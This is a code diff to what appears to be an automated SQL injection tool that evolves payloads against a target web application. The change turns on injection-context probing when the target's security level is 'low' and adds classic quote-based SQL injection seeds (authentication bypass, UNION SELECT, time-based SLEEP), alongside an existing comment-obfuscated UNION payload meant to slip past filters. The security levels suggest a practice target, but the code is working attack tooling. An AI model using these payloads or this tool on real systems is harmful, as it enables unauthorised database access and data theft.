@@ -12,14 +12,15 @@ from core.island_manager import IslandManager
 from core.context_discoverer import ContextDiscoverer
 from utils.data_extractor import DataExtractor
 
-def detect_injection_type(client):
-    print("[*] Fingerprinting target injection type... [DISABLED BY USER]", flush=True)
-    # Passed globally due to temporary user override, but discovery is completely bypassed now.
-    # discoverer = ContextDiscoverer(client, disable_strings=True)
-    # discoverer.discover()
-    # return {"context": discoverer.detected_context, "db_type": "MySQL"}
+def detect_injection_type(client, target_security="medium"):
+    if target_security == "low":
+        print("[*] Security level is LOW. Enabling full Context Discovery...", flush=True)
+        discoverer = ContextDiscoverer(client, disable_strings=False)
+        discoverer.discover()
+        return {"context": discoverer.detected_context, "db_type": "MySQL"}
     
-    # Return a generic quoteless fallback context immediately without sending ANY probes.
+    print("[*] Fingerprinting target injection type... [RESTRICTED MODE]", flush=True)
+    # Return a generic quoteless fallback context immediately without sending ANY probes if not low.
     return {"context": "QUOTELESS_STRING", "db_type": "MySQL"}
 
 def run_prometheus():
@@ -42,9 +43,12 @@ def run_prometheus():
         print("[!] Failed to establish session.", flush=True)
         return
 
-    discovery_result = detect_injection_type(client)
+    discovery_result = detect_injection_type(client, target_security=target_security)
     inj_type = discovery_result.get("context", "GENERIC")
     db_type = discovery_result.get("db_type", "GENERIC")
+    
+    # Global flag based on security level
+    disable_quotes = (target_security != "low")
     
     # Targets Persistence
     exp_manager.save_target_profile(client.base_url, db_type=db_type)
@@ -57,7 +61,14 @@ def run_prometheus():
       "1/*!50000UNION*//*!50000SELECT*/1,2"
     ]
 
-    island = IslandManager(client, base_payloads, exp_manager, population_size=pop_size, context=inj_type)
+    # Add quote-based seeds if level is low
+    if target_security == "low":
+        base_payloads.extend([
+            "admin'--", "' OR '1'='1", "1' UNION SELECT 1,2#",
+            "1' AND 1=1#", "1' AND SLEEP(5)#"
+        ])
+
+    island = IslandManager(client, base_payloads, exp_manager, population_size=pop_size, context=inj_type, disable_strings=disable_quotes)
     
     start_gen = island.current_gen
     max_generations = start_gen + max_gens
